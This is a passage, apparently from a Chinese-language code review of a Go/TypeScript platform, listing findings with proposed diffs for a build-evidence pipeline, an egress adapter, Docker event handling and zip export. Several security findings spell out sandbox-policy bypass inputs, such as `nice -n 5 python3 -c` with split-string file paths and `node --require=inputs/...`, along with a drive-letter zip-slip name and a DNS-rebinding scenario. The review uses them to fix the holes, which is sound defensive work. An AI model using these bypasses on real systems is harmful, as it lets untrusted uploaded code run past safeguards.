material seam 未接线时返回的 fs.ErrNotExist）、JSON 被拒或工具链不匹配时，会原样返回 inner 的证据——即 legacy 共享树中陈旧
build-log.json 的 BuildRan/BuildExitCode 会被带进本 Run 的 CollectCandidate → craft.BuildChecks，直接影响 T15
四检晋升门的 build 检查。这违反了本处注释自己声明的契约（"绝不读 legacy 共享树/未观测"，即上一轮 ledger 记录的 HIGH #5 修复目标）。修复：在 legacy
包装之前保存 preview-only 证据，runView 路线以它为 inner，使 run-bound 日志缺失时 build 事实保持 unobserved。

- 		runViewEvidence = craftWebBuildEvidenceSource(evidence, func(ctx context.Context, task craft.Task) ([]byte, error) {
+ 	// 在 legacy 包装之前保留 preview-only 证据：RunView 路线的 inner 绝不能
+ 	// 含 legacy build-log reader，否则 run-bound 日志缺失时会回落到共享树。
+ 	previewEvidence := evidence
+ 	if toolchainDir := strings.TrimSpace(os.Getenv(craftWebToolchainDirEnv)); toolchainDir != "" {
+ 		pin, pinErr := LoadCraftWebToolchainPin(toolchainDir)
+ 		if pinErr != nil {
+ 			return nil, fmt.Errorf("craft web toolchain pin %s: %w", toolchainDir, pinErr)
+ 		}
+ 		pin.RuntimeDigest = runtimeDigest
+ 		evidence = craftWebBuildEvidenceSource(evidence, craftSessionBuildLogReader(source, outputDir), pin)
+ 	}
+ 	...
+ 	runViewEvidence := previewEvidence
+ 	if toolchainDir != "" {
+ 		runViewEvidence = craftWebBuildEvidenceSource(previewEvidence, func(ctx context.Context, task craft.Task) ([]byte, error) {
  			if runViewLogReader == nil {
  				return nil, fs.ErrNotExist
  			}
  			return runViewLogReader(ctx, task)
  		}, runViewPin)
+ 	}


─── internal/container/craft_runtime.go:212-216 ───
[maintainability · low] toolchain pin 被从磁盘重复加载：第 167-175 行已经 LoadCraftWebToolchainPin 同一目录并设置了
RuntimeDigest，这里再次加载同一 env 变量（本函数内该 env 共读取 3 次）。两次加载完全冗余，且若启动瞬间目录内容被替换，legacy 路线与 runView 路线会拿到不同的
pin。建议提取局部变量 toolchainDir 并复用第一次加载的 pin（可与上一条意见的 previewEvidence 重构一并处理）。

- 	if strings.TrimSpace(os.Getenv(craftWebToolchainDirEnv)) != "" {
- 		runViewPin, pinErr := LoadCraftWebToolchainPin(strings.TrimSpace(os.Getenv(craftWebToolchainDirEnv)))
+ 	toolchainDir := strings.TrimSpace(os.Getenv(craftWebToolchainDirEnv))
+ 	var webPin *CraftWebToolchainPin
+ 	if toolchainDir != "" {
+ 		pin, pinErr := LoadCraftWebToolchainPin(toolchainDir)
  		if pinErr != nil {
- 			return nil, fmt.Errorf("craft web toolchain pin %s: %w", os.Getenv(craftWebToolchainDirEnv), pinErr)
+ 			return nil, fmt.Errorf("craft web toolchain pin %s: %w", toolchainDir, pinErr)
  		}


─── internal/container/craft_runtime.go:289-289 ───
[maintainability · low] runViewBuildLogReader 字段只写不读：全仓库（含生产代码与测试）没有任何读取点，实际生效的 late-bind
路径是闭包捕获的局部变量 runViewLogReader。这个死字段会误导后续维护者以为 RunView 构建日志 seam 已通过该字段接通（例如 T20
消费方）。建议删除该字段及其赋值，或在接入其预期消费方时再引入。

- 	runtime.runViewBuildLogReader = runViewLogReader
+ 	// 删除该字段赋值及 localCraftRuntime.runViewBuildLogReader 字段声明：
+ 	// evidence 链已通过闭包捕获的 runViewLogReader 完成 late-bind。


─── internal/container/craft_runtime.go:286-287 ───
[bug · high] runView
构建日志读取器永远无法成功：runBoundCraftArtifactSource.ReadSessionFile（craft_runtime.go:2111）强制要求目标文件已通过同一 source
实例的 ListSessionFiles 完成枚举（`expected, ok := s.listed[rel]; if !ok ... { return ErrConflict
}`），而这里每次调用都 newRunBoundCraftArtifactSource 新建实例后直接 ReadSessionFile，从未先 ListSessionFiles，因此必然返回
"artifact was not listed from the bound RunView"（ErrConflict，而非 fs.ErrNotExist）。后果：T04 (#123)
RunView 路线的 BuildRan/BuildExitCode 证据永远读不到本 Run 的 output/build-log.json，craftWebBuildEvidenceSource
对非 ErrNotExist 错误只记一条 Warn 并回落到 inner 证据（即已确认发现 1 中的 legacy 共享树陈旧日志）——构建事实被静默替代，且每次证据评估都产生一条
ErrConflict 噪声日志。这是与发现 1 不同的独立根因（即使 inner 修正为 preview-only，本读取器仍结构性失效）。建议先 List 再 Read，并将"日志不存在"映射为
fs.ErrNotExist 以保持 inner 回落语义：

+ 		entries, err := source.ListSessionFiles(ctx, task.Scope.SessionID, craftLocalOutputDir)
+ 		if err != nil {
+ 			return nil, err
+ 		}
  		logPath := path.Clean(craftLocalOutputDir + "/" + craftWebBuildLogName)
+ 		listed := false
+ 		for _, entry := range entries {
+ 			if entry.Path == logPath && entry.Type == sandbox.RemoteEntryFile {
+ 				listed = true
+ 				break
+ 			}
+ 		}
+ 		if !listed {
+ 			return nil, fs.ErrNotExist
+ 		}
  		return source.ReadSessionFile(ctx, task.Scope.SessionID, logPath)


─── internal/handler/craft_model_gateway.go:529-535 ───
[security · low] 错误信息暴露不一致：本 diff 中 recordCall 已明确改为不向客户端透出原始错误（"the raw error stays server-side
only — clients get an opaque marker"），但 Forward 的 ACTIVITY_UNRESOLVED/UPSTREAM_ERROR 响应仍把
resolveErr（resolveCraftChargeStart 底层为 gorm Updates，错误文本可能包含 SQL/表名等数据库内部细节）与网络错误 errors.Join
后原文返回给调用方（各 resolve 失败分支同样如此，包括 !attempted 分支的 resolveErr.Error()）。建议与 recordCall 保持同一策略：服务端 logger
记录细节并附带 run/call/attempt 标识，客户端仅返回固定文案。

  	if initiationExpired {
  		closeGatewayResponse(resp)
  		g.recordCall(c, payload, callID, attemptID, model, nil)
  		resolveErr := attempt.Resolve(c.Request.Context(), service.CraftChargeStartUnknown)
- 		appFail(c, http.StatusBadGateway, "ACTIVITY_UNRESOLVED", errors.Join(forwardErr, resolveErr).Error())
+ 		if resolveErr != nil {
+ 			logger.ErrorWithFields(c.Request.Context(), resolveErr, logger.Fields{
+ 				"event": "craft_model_gateway_charge_resolve_failed", "run_id": payload.RunID, "call_id": callID,
+ 			})
+ 		}
+ 		appFail(c, http.StatusBadGateway, "ACTIVITY_UNRESOLVED", "charge start outcome could not be recorded; reconcile the activity before retry")
  		return
  	}


─── internal/handler/session/artifact_download.go:814-814 ───
[security · low] zip 条目名完全依赖服务层 ValidateExportBundleMembers/ValidateArtifactPath 的路径校验。该规则拒绝
".."、"."、前导 "/"、反斜杠与 NUL，但不拒绝 Windows 盘符前缀："C:/evil.html" 的首元素 "c:" 是合法路径分量（非空、非点元素、无反斜杠、不以 "/"
开头），可以通过收集门进入版本并在本行成为 zip 条目名。带盘符前缀的条目是 zip-slip 的已知变体（OWASP Unzip 风险之一）：多数现代解压器（7-Zip、Windows
Explorer、Python>=3.6）会清洗或视为相对路径，但部分旧解压工具/自写解包逻辑会将其写到目标目录之外。建议在写出 200 响应头之前对流内所有 member.Path
做防御性拒绝（首元素形如单 ASCII 字母+冒号），或推动在 ValidateArtifactPath 中补上该规则，使导出打包对路径逃逸形态的拒绝与收集门保持同等完备。

- 		entry, createErr := zipWriter.CreateHeader(&zip.FileHeader{Name: member.Path, Method: zip.Deflate})
+ 	// before writing the 200 head: refuse drive-letter prefixed members (zip-slip variant)
+ 	for _, member := range bundle.Version.Files {
+ 		if elem := member.Path; len(elem) >= 2 && elem[1] == ':' &&
+ 			((elem[0] >= 'a' && elem[0] <= 'z') || (elem[0] >= 'A' && elem[0] <= 'Z')) {
+ 			craftShareHTTPError(c, fmt.Errorf("%w: member %q uses a drive-letter path", craft.ErrConflict, member.Path))
+ 			return
+ 		}
+ 	}
+ 	for _, member := range bundle.Version.Files {


─── internal/handler/session/artifact_download.go:777-780 ───
[bug · high] 中途失败契约在当前路由装配下不成立：该路由经 RegisterCraftSessionRoutes→featureRoutes.Mount(sessions) 挂在主
engine 上，而主 engine 全局注册了
middleware.Recovery()（internal/router/router.go:172）。internal/middleware/recovery.go 会 recover 所有
panic（不识别 http.ErrAbortHandler 哨兵），随即调用 c.AbortWithStatusJSON(500,...)——此时 200 头与部分 zip 字节已写出（gin
responseWriter.Written()==true，WriteHeaderNow 为空操作），500 JSON 体被追加到已流出的截断 zip 之后，panic 被吞掉后 handler
链正常返回、net/http 干净终结 chunked 响应。客户端最终拿到的是"成功"完成的 200 下载：缺少 central directory 的截断 zip + 尾部
{"error":"Internal Server Error","message":"http.abort"}——恰是注释声明要杜绝的降级交付，digest
不匹配/成员读取失败等所有中止路径全部失效。注释引用的"craftegress precedent"并不存在：craftegress 生产代码未用此模式，仅测试模拟。建议二选一：(1) 首选在
middleware.Recovery 中对 http.ErrAbortHandler 直接 re-panic（net/http 对该哨兵会静默断连，HTTP/1.1 与 HTTP/2
均生效）；(2) 在本 handler 内沿用仓内 T01 "write-then-cut" 先例 hijack 后立即关连接（gin 的 c.Writer 实现了 http.Hijacker，见
sandbox_terminal_ws.go:192 的 WS 升级用法），hijack 失败再回退 panic。另注：artifact_export_abort_t12_test.go 只断言
handler 直接 panic，未覆盖中间件链，故该缺陷未被测试暴露。

  	abortDownload := func(format string, args ...any) {
  		logger.Warnf(c.Request.Context(), format, args...)
+ 		// middleware.Recovery 会吞掉 http.ErrAbortHandler 并在已开始的 200
+ 		// 响应后追加 500 JSON、正常收尾——必须自行切断传输（T01 write-then-cut）。
+ 		if hij, ok := c.Writer.(http.Hijacker); ok {
+ 			if conn, _, herr := hij.Hijack(); herr == nil {
+ 				_ = conn.Close()
+ 				return
+ 			}
+ 		}
  		panic(http.ErrAbortHandler)
  	}


─── internal/modules/craft/archive.go:180-184 ───
[performance · medium] reserveEntry 对目录条目(及 tar 的 TypeXHeader/TypeXGlobalHeader
元数据条目)没有任何条目总数上限:MaxArchiveEntries 只在 readMember(常规文件)中检查。归档输入受 MaxInputBytes(20 MiB)约束,但一个恶意 zip
的中央目录每条目最少约 78 字节,可塞入约 25–40 万个目录条目;zip.NewReader 解析出的 File 结构、seen map 的 canonical 路径键与
ValidateArchiveEntryPath 的处理合计造成约 4–7 倍于输入的内存放大(单请求峰值可达数十至上百 MB,并发可叠加),且消耗发生在 30 秒预算检查点之前的纯 CPU
阶段。这与文件头注释的声明不符:"memory is bounded because members are buffered only up to the cumulative
expanded-byte ceiling" —— 该上限只覆盖成员内容缓冲,不覆盖目录条目的解析结构与路径集合。建议在 reserveEntry 中对 seen 集合总大小(文件+目录)施加与
MaxArchiveEntries 一致或邻近的硬上限,使总解析开销与条目数同受控。

  func (b *archiveBudget) reserveEntry(name string) (string, error) {
+ 	if len(b.seen) >= MaxArchiveEntries {
+ 		return "", fmt.Errorf("%w: archive holds more than %d entries across files and directories", ErrInvalidInput, MaxArchiveEntries)
+ 	}
  	canonical, err := ValidateArchiveEntryPath(name)
  	if err != nil {
  		return "", err
  	}


─── internal/modules/craft/input_code.go:446-448 ───
[security · high] InterpreterPrefix 对携带选项的 wrapper 会误判为"非解释器"，导致内联程序文本逃逸审查：switch 只处理
env/timeout/xargs 的选项跳过，`nice -n 5 …`、`setsid -w …`、`time -p …`、`stdbuf -oL …` 会在下一个 token（如
"-n"）处因既非解释器也非 wrapper 而返回 false；`env -iu VAR …`（组合短标志不消耗 -u 的值操作数）与 `timeout -k 5 10 …`（timeout
在标志后只消耗一个操作数）同样失效。此后 Review 退入非解释器分支：`-c`/`-e` 等内联程序不再被 carriesProgramTextFlag 直接拒绝，只剩 shellTokens
词法筛选——而 shellTokens 剥掉引号后，`'in'+'puts/x.py'` 变成 `in+puts/x.py`，无法命中
withinInputs。服务端适配器（CraftDelegateExecutionPolicy）明确无法提供文件目标摘要/ResolvedTargetPath 证据，因此形如 `nice -n 5
python3 -c "exec(open('in'+'puts/x.py').read())"`（WorkingDir=/workspace，上传材料位于
/workspace/inputs/x.py）会得到 Allowed=true——上传代码被执行，破坏 T03 "上传材料只读、绝不执行"的核心不变量，也违背 wrapperCommands
注释"wrapping launcher 无法走私上传脚本"的承诺。建议：为其余 wrapper 增加默认分支跳过前导选项（值型选项如 nice -n N 连值一起跳过）、让 env
组合短标志按尾字符 u/S 消耗值操作数；更稳妥的方向是当 wrapper 操作数结构无法被结论性解析时按解释器形态失败关闭（走程序文本拒绝），而非静默降级到词法分支。

  		offset++
  		switch base {
  		case "env":
+ 		// ... existing env/timeout/xargs cases ...
+ 		default:
+ 			// nice/setsid/time/stdbuf: skip their leading flags; value-taking
+ 			// flags (nice -n N) consume their operand too. A wrapper whose
+ 			// operand structure cannot be conclusively parsed must fail closed
+ 			// (treat as interpreter-shaped) instead of degrading to the
+ 			// lexical-only non-interpreter branch.
+ 			for offset < len(command) && strings.HasPrefix(command[offset], "-") && command[offset] != "-" {
+ 				flag := command[offset]
+ 				offset++
+ 				if base == "nice" && flag == "-n" && offset < len(command) {
+ 					offset++
+ 				}
+ 			}
+ 		}


─── internal/modules/craft/input_code.go:336-348 ───
[security · high] `=` 附值的选项（`--flag=value` / `-fvalue`）绕过全部词法审查层，上传代码可经启动钩子执行：

1. 解释器分支的标志循环对任何 `-` 开头的操作数在未命中短标志程序文本检查后直接 `continue`（L336-348），`--require=inputs/<digest>/x.js`
的附值部分从不进入 canonical/withinInputs 筛查——而 2b 环境层注释（L267-273）明确把 "NODE_OPTIONS --require"
列为同类启动钩子威胁，argv 上的等价形式却未被覆盖。具体绕过：`node --require=inputs/<digest>/x.js /workspace/app/main.js`（node
启动即执行上传字节，判 Allowed）、`bash --init-file=inputs/<digest>/x.sh`；
2. 非解释器分支（L378-386）虽筛查操作数 token，但 `make -finputs/<digest>/Makefile` 作为整 token 规范化成
`/workspace/-finputs/...`，永不命中 inputs 树，make 会执行上传 Makefile 中的命令；
3. 同根因：长形式程序文本选项（`--eval`/`--print`/`--execute`）不像 `-c/-e/-r` 那样被拒，`node
--eval='require("in"+"puts/x.js")'` 的附值形式同样完全逃逸（分离形式仅靠子 token 筛查部分兜底）。

测试（input_code_test.go）传入原始 argv，无任何 `=value` 归一化层兜底。建议：对含 `=` 的 token 追加筛查 `=`
之后的子串（短标志可类推标志字母后的后缀），并把已知长形式程序文本选项纳入拒绝清单——筛查只增不减，与 shellTokens "只能增加被筛查 token" 的设计一致。

  				if strings.HasPrefix(arg, "-") {
- 					// Program-text options are unreviewable by construction
- 					// (their payload is code, not a screenable path):
- 					// -c/-e/-r inline programs (python3 -c, node -e, php
- 					// -r, perl -e, ruby -e/-r, awk -e), including combined
- 					// short groups (-cexec(...), -lc "...") and python -m
- 					// module indirection. Long options and the bare "-"
- 					// stdin marker are not program text.
  					if arg != "-" && !strings.HasPrefix(arg, "--") && carriesProgramTextFlag(arg) {
  						return p.deny("interpreter_input", arg, "")
+ 					}
+ 					// --flag=value / -fvalue: the attached value must be
+ 					// screened too (node --require=inputs/x.js executes the
+ 					// uploaded bytes at startup, exactly like NODE_OPTIONS).
+ 					if eq := strings.Index(arg, "="); eq >= 0 {
+ 						for _, token := range shellTokens(arg[eq+1:]) {
+ 							for _, segment := range strings.Split(token, ":") {
+ 								if abs := p.canonical(req.WorkingDir, segment); p.withinInputs(abs) {
+ 									return p.deny("input_target", abs, "")
+ 								}
+ 							}
+ 						}
  					}
  					continue
  				}


─── internal/modules/craft/version.go:457-462 ───
[maintainability · low] ValidVersionID 与同包既有 preview.go:82 的 IsVersionID 语义完全相同(均为 VersionIDPrefix
前缀 + 恰好 64 个小写 hex 字符),构成同包内的重复实现。当前两者行为一致无用户可见影响,但一旦前缀/长度/大小写规则在一处调整而另一处遗漏,release.go 的
WebPromotionRecord.Validate(用 IsVersionID)与证据/导出路径(用 ValidVersionID)将对同一 version id
给出不同答案,出现"晋升请求校验通过但证据校验拒绝"的边界分歧。建议收敛为单一实现:ValidVersionID 直接委托 IsVersionID(或反之删除其一)。

  func ValidVersionID(id string) bool {
- 	if !strings.HasPrefix(id, VersionIDPrefix) || len(id) != len(VersionIDPrefix)+64 {
- 		return false
- 	}
- 	return ValidSHA256(strings.TrimPrefix(id, VersionIDPrefix))
+ 	return IsVersionID(id)
  }


─── internal/modules/craftegress/adapter.go:21-22 ───
[bug · high] 默认转发超时与对端网关预算错配，长生成模型调用会被永久卡死。http.Client.Timeout
覆盖"建连+等待响应头+读完整响应体"全程，而本链路对端网关（internal/handler/craft_model_gateway.go L167-169）ForwardTimeout 默认 5
分钟且自身全量缓冲（io.ReadAll 后一次性 c.Data）——即网关为非流式长生成明确预留 5 分钟。适配器在 120s 处中断后走 unknown-outcome 路径：attempt 永久
parked，同指纹重试复用同一 ID 必触发网关 BeginBinding 冲突 409 ACTIVITY_UNRESOLVED，该次调用进入需人工对账才能解开的死锁。且
cmd/craft-egress-adapter 未暴露任何超时 env 覆盖，生产只能吃到这个 120s 默认值。建议默认对齐（≥ 网关 5min），并在注释/部署文档中写明两端口径必须联动。

  	craftEgressDefaultMaxBodyBytes = 16 << 20
- 	craftEgressDefaultTimeout      = 120 * time.Second
+ 	// 必须不低于网关 ForwardTimeout 预算（internal/handler/craft_model_gateway.go 默认 5min），
+ 	// 否则长生成在适配器侧中断后 attempt 永久 parked，重试必撞网关 409。
+ 	craftEgressDefaultTimeout = 5 * time.Minute


─── internal/modules/craftegress/adapter.go:83-86 ───
[security · medium] 启动期一次性 host 校验与运行期拨号存在 TOCTOU：ValidateGatewayTarget 仅在进程启动时做一次 DNS
解析并拒绝私网/环回（cmd/craft-egress-adapter/main.go 调用），而运行期转发使用 http.DefaultTransport，每个请求独立重新解析网关主机，且未设置
CheckRedirect。网关域名的 DNS 记录在启动校验之后变化（rebinding/短 TTL 切换）即可让后续携带 Bearer
执行凭据的物理发送落到内网或云元数据地址，启动期校验被绕过。建议为默认 transport 做请求期钉死：自定义 DialContext（或在 Control 钩子中）对连接实际使用的 IP 复用
rejectPrivateIP 复核，并用 CheckRedirect 拒绝重定向或对重定向目标重跑校验。

  	transport := config.Transport
  	if transport == nil {
- 		transport = http.DefaultTransport
+ 		base := http.DefaultTransport.(*http.Transport).Clone()
+ 		base.DialContext = pinnedGatewayDial(target.Hostname()) // 连接期对实际 IP 复核 rejectPrivateIP
+ 		base.CheckRedirect = func(req *http.Request, via []*http.Request) error {
+ 			return http.ErrUseLastResponse // 或对重定向目标重跑 ValidateGatewayTarget
+ 		}
+ 		transport = base
  	}


─── internal/modules/craftegress/adapter.go:125-127 ───
[bug · medium] Reuse 与 Allocate 是两次独立加锁的 check-then-act：适配器以单一共享 Handler 挂在 http.Server
上，并发到达的两个相同指纹（同 method/path/body）请求可同时判定无可复用记录而各自 Allocate，铸造两个身份，unresolved[digest]
只保留后写者。后续危害：先铸身份的 Resolve 按 digest（而非 attemptID）删除 map 项会误删另一身份的 parked 记录；ordinalLocked 找不到该
attemptID 时回退 nextOrd 产生错误 ordinal；replay 时两条同 digest 的 unresolved 记录按 map 遍历序随机决定谁覆盖谁。破坏"同一指纹至多一个
parked 身份"的协议不变量。建议在 journal 内提供单锁原子原语（判定+铸造一步完成），ServeHTTP 只调用它。

- 		record, reusable := a.journal.Reuse(digest)
- 		if !reusable {
- 			allocated, err := a.journal.Allocate(digest)
+ 		record, err := a.journal.AllocateIfNotParked(digest)
+ 		if err != nil {
+ 			http.Error(w, "egress attempt journal unavailable", http.StatusServiceUnavailable)
+ 			return
+ 		}
+ // journal.go 内：
+ // func (j *CraftEgressAttemptJournal) AllocateIfNotParked(digest string) (CraftEgressAttemptRecord, error) {
+ // 	j.mu.Lock(); defer j.mu.Unlock()
+ // 	if record, ok := j.unresolved[digest]; ok { return record, nil }
+ // 	... // 单次临界区内完成铸造+落盘
+ // }


─── internal/modules/craftegress/adapter.go:175-175 ───
[bug · medium] 仅凭 resp.StatusCode == 409 判定"网关冲突→parked"会把上游 409 透传误判为 ACTIVITY_UNRESOLVED。网关的 409
有两个来源：自身 BeginBinding 冲突（appFail 409 code=ACTIVITY_UNRESOLVED，craft_model_gateway.go
L508-510）和上游模型服务状态码原样透传（Forward 末尾 c.Data(resp.StatusCode, ...)）。若上游返回 409（部分 OpenAI
兼容代理用于并发/冲突场景），网关侧已 attempt.Resolve(ChargeStartStarted) 视为终局，适配器却将身份 parked；此后同指纹重试复用该 ID 必触发网关真
409，活动被永久卡死。建议区分二者：解析响应体的 appFail code（仅 ACTIVITY_UNRESOLVED 才 non-definitive），或由网关为透传响应加显式标记头。

- 		definitive := resp.StatusCode != http.StatusConflict
+ 		definitive := resp.StatusCode != http.StatusConflict || !isGatewayActivityUnresolved(responseBody)
+ // isGatewayActivityUnresolved 解析网关 appFail 响应体的 code 字段，仅 code=="ACTIVITY_UNRESOLVED" 视为停靠信号；
+ // 上游透传的 409 走终局 Resolve，避免与网关自身冲突语义混淆。


─── internal/modules/craftegress/adapter.go:227-227 ───
[bug · low] 指纹未包含 r.URL.RawQuery，而 targetURL 会把查询串原样拼进转发 URL：同 path+body、不同 query 的两个逻辑请求会共享并复用同一
parked 身份，活动归因错配。当前网关两条路由都不读 query，暂无实际影响，但适配器是通用转发器，后续出现带 query 的端点会静默串号。建议把 RawQuery 纳入指纹前缀。

- func craftEgressRequestDigest(method, path string, body []byte) string {
+ func craftEgressRequestDigest(method, path, rawQuery string, body []byte) string {
+ 	digest := sha256.Sum256(append([]byte(strconv.Itoa(len(path))+"\x00"+method+"\x00"+path+"\x00"+rawQuery+"\x00"), body...))
+ 	return hex.EncodeToString(digest[:])
+ }


─── internal/modules/craftegress/adapter.go:173-175 ───
[bug · high] 仅凭 HTTP 409 判定 parked 漏掉了网关表达"结果未知"的另一类响应：internal/handler/craft_model_gateway.go 的
Forward 在 initiation 超时（L533）、转发失败/无响应（L543，Resolve(CraftChargeStartUnknown)）、上游 body
读取中断或超限（L564）、attempt.Resolve(Started) 落库失败（L569）等场景返回 502 + body
error.code=ACTIVITY_UNRESOLVED（appFail 结构为 {"error":{"code":...}}），网关侧均将 charge-start 记为
Unknown/已发生。适配器把这些完整到达的 502 视为 definitive 并 Resolve 落盘，客户端随后重试同一逻辑请求（同 digest）时 Reuse 落空、mint 全新
activityID——新身份构成新的 activity key，与旧 binding 无冲突，BeginBinding 直接放行，同一逻辑请求被物理发送两次并各自计费（双扣），违背本包文档承诺的
"reuses that identity after an unknown outcome"。这与已确认的"上游 409 透传被误判 parked"是同一行判定的相反方向缺陷：一个过度
parked，一个漏 parked。建议解析网关响应 body 的 error.code，凡 code=ACTIVITY_UNRESOLVED（无论 409 还是 502）一律保持
unresolved/parked，交由上层 reconcile；可顺带推动网关把 L543 的 Unknown 场景与 L526 的 DefinitelyNotStarted 场景用不同 code
区分。

- 		// A gateway conflict (ACTIVITY_UNRESOLVED) parks rather than resolves:
- 		// the durable attempt stays reusable until reconciliation.
- 		definitive := resp.StatusCode != http.StatusConflict
+ 		// 网关对"结果未知"有两类表达：409 冲突，以及 502 + body
+ 		// error.code=ACTIVITY_UNRESOLVED（Unknown 结局）。两类都保持
+ 		// parked，等待上层 reconcile，避免同指纹重试 mint 新身份造成双发。
+ 		definitive := resp.StatusCode != http.StatusConflict &&
+ 			!craftEgressBodyDeclaresOutcomeUnknown(responseBody)


─── internal/modules/craftegress/journal.go:98-101 ───
[bug · medium] replay 对任何 Unmarshal 失败的行直接返回错误，撕裂尾行会永久 brick 适配器启动。appendLocked 的单次 file.Write
在崩溃/断电时可能只落盘半行（Write 部分成功后返回错误时同样已写入部分字节），重启后 replay 命中该行即 json.Unmarshal 失败 →
OpenCraftEgressAttemptJournal 构造失败 → cmd 侧 log.Fatal，该 Run 的全部模型出流量被阻断，只能人工修复 journal 文件。append-only
journal 的惯例是：仅容忍并截断末尾不完整行，中间行损坏才报错。建议在 scanner 循环中记录是否已到文件末尾（或改用 io.ReadAll
后按行切分），对最后一条不完整记录截断文件并继续。

  		var record CraftEgressAttemptRecord
  		if err := json.Unmarshal(line, &record); err != nil {
+ 			if atEOF { // 末尾撕裂行：截断后继续，仅中间损坏才拒绝启动
+ 				return j.truncateTornTail(offset)
+ 			}
  			return fmt.Errorf("craftegress: journal record unreadable: %w", err)
  		}


─── internal/modules/craftegress/journal.go:161-167 ───
[bug · medium] Resolve 在 appendLocked 持久化之前就变更内存状态（delete unresolved / 标记 resolved），与 Allocate 的
fail-closed 顺序（append 成功后才更新内存）不一致。当 appendLocked 因磁盘满/IO 错误失败时：当前进程内该 digest 的 attempt 已从
unresolved 删除，Reuse 落空 → 下次同 digest 请求 Allocate 新身份；而 journal 落盘记录仍是 unresolved，进程重启 replay 后同一
digest 又回到"可复用"。同一次失败在进程内外产生相反语义。同时 adapter.go 调用点的注释 "a failed resolution record leaves the attempt
reusable, which reconciles safely on the next pass" 与此处的实际行为相反（失败后内存中恰恰不可复用）。具体危害场景：网关侧已
attempt.Resolve(Started)（物理调用已计费）而适配器 journal 的 resolve 落盘失败，重启后 replay 出 unresolved → 复用旧 ID → 网关
BeginBinding 必然 409，attempt 永久 parked。建议调整为与 Allocate 相同的顺序：先 appendLocked 成功，再更新内存 map。

  	if definitive {
  		state = CraftEgressAttemptResolved
  		resolvedNano = j.now().UnixNano()
+ 	}
+ 	if err := j.appendLocked(CraftEgressAttemptRecord{
+ 		Ordinal: j.ordinalLocked(attemptID), AttemptID: attemptID, RequestDigest: requestDigest,
+ 		State: state, GatewayStatus: gatewayStatus, CreatedNano: j.now().UnixNano(), ResolvedNano: resolvedNano,
+ 	}); err != nil {
+ 		return err // 持久化失败时内存保持 unresolved，与 Allocate 的 fail-closed 顺序一致
+ 	}
+ 	if definitive {
  		delete(j.unresolved, requestDigest)
  		j.resolved[requestDigest] = true
  	}
- 	return j.appendLocked(CraftEgressAttemptRecord{
+ 	return nil


─── internal/modules/execution/sandbox/docker_exec_events.go:126-142 ───
[bug · medium] 接收循环未用 comma-ok 检测 Messages 通道关闭，且 `err == nil → continue` 不是终止条件。moby client 的
EventsResult 契约是"Messages 在 API 流结束时关闭"：若客户端以关闭 Messages（而不投递非 nil 错误到 Err）或以 nil 错误通知流结束，本循环将忙转并持续向
batch 追加零值 events.Message——CPU 空转 + 无界内存增长（在 resolveTerminalDuration 的 3s 窗口内足以 OOM）。代码自身的 `err ==
nil` 分支说明作者预期 nil 可能到达，但该分支与关闭的 Messages 组合恰是永不终止的状态。建议对 Messages 使用 `case msg, ok :=
<-result.Messages`，将通道关闭与 nil Err 均视为流终止并进入配对结算。

- 	for {
+ 	messagesOpen := true
+ 	for messagesOpen {
  		select {
  		case <-ctx.Done():
  			return unavailable, DockerExecEventPairUnavailable, ctx.Err()
- 		case err := <-result.Err:
- 			if err == nil {
- 				continue
- 			}
- 			if isDockerEventStreamEOF(err) {
+ 		case err, ok := <-result.Err:
+ 			if !ok || err == nil || isDockerEventStreamEOF(err) {
  				pair, status := pairDockerExecEvents(batch, receipt.ContainerID, receipt.ExecID)
  				return pair, status, nil
  			}
  			return unavailable, DockerExecEventPairUnavailable, dockerError("RestrictedExecEvents", err)
- 		case msg := <-result.Messages:
+ 		case msg, ok := <-result.Messages:
+ 			if !ok {
+ 				messagesOpen = false
+ 				continue
+ 			}
  			batch = append(batch, msg)
  		}
  	}
+ 	pair, status := pairDockerExecEvents(batch, receipt.ContainerID, receipt.ExecID)
+ 	return pair, status, nil


─── internal/modules/execution/sandbox/docker_exec_events.go:108-110 ───
[test · medium] 对 *client.Client 的 Events 方法做运行时接口断言，但整个仓库没有任何编译期或测试期证据钉住该签名与所依赖的 moby/moby/client
v0.5.1 一致：dockerEngineAPI 刻意不包含 Events，本文件也没有类似 docker_normal_exec.go 末尾 `var _
DockerNormalExecEngine = (*client.Client)(nil)` 的静态断言，而 ObserveExecEventPair 的守护进程路径完全无测试覆盖。若 v0.5.1
的 Events 实际返回 (EventsResult, error) 双值，此断言对真实客户端永不成立，整条"权威时长证据"路径会静默退化为 unsupported（调用方
craft_docker_restricted_exec.go 对 err/status 一律降级为
unavailable，无任何告警）。建议增加包级编译期断言（一行即可让签名漂移在构建期暴露），并补一条针对真实回放终止行为的集成/契约测试。

- 	streamer, ok := api.(interface {
+ var _ interface {
- 		Events(ctx context.Context, options client.EventsListOptions) client.EventsResult
+ 	Events(ctx context.Context, options client.EventsListOptions) client.EventsResult
- 	})
+ } = (*client.Client)(nil)


─── internal/modules/execution/sandbox/docker_exec_events.go:149-154 ───
[bug · low] 以错误文本包含 "EOF" 判定干净回放结束过于宽泛：`io.ErrUnexpectedEOF` 的文本是 "unexpected EOF"，json.Decoder
在事件流被截断（半条 JSON）时恰恰返回它；任何错误消息中恰好含 "EOF" 的真实网络错误也会被误判。误判后果是把传输失败吞成"干净结束 + 无错误的
unavailable"，与该文件"explicitly indeterminate, never a guess"的证据原则相悖，且排障时无线索。建议改用 `errors.Is(err,
io.EOF)` 精确匹配（该客户端的 EOF 经 %w 包装时同样成立）。

  func isDockerEventStreamEOF(err error) bool {
- 	if err == nil {
- 		return false
- 	}
- 	return strings.Contains(err.Error(), "EOF")
+ 	return errors.Is(err, io.EOF)
  }


─── packages/domain/src/craft/web-promotion.ts:41-43 ───
[maintainability · medium] defaultPreviewVersion 的 newest-first 前置条件完全依赖调用方约定：WebVersionEvidenceFact
只含 id 与 webEvidence，没有任何可排序字段（时间戳/序号），因此函数自身（乃至任何防御性检查）都无法验证传入顺序。一旦未来接线时调用方传入乱序或方向相反的数组，会静默返回一个较旧的
ready 版本占据默认席位，直接违反 #107 "最新通过四检查的版本才成为默认"的核心规则。目前全仓库唯一消费方是 web-promotion.test.ts（T15
报告将前端接线标注为可选），风险将在接线时兑现。建议让规则自身具备顺序无关性：在 fact 中携带可排序事实（如 createdAt/sequence）并在函数内取最大值，而非信任调用方排序。

+ export interface WebVersionEvidenceFact {
+   id: string;
+   createdAt: string; // 可排序事实，使规则自身可判定"最新"而非信任调用方排序
+   webEvidence: WebCheckEvidenceFact | null;
+ }
+ 
  export function defaultPreviewVersion(
    versions: readonly WebVersionEvidenceFact[],
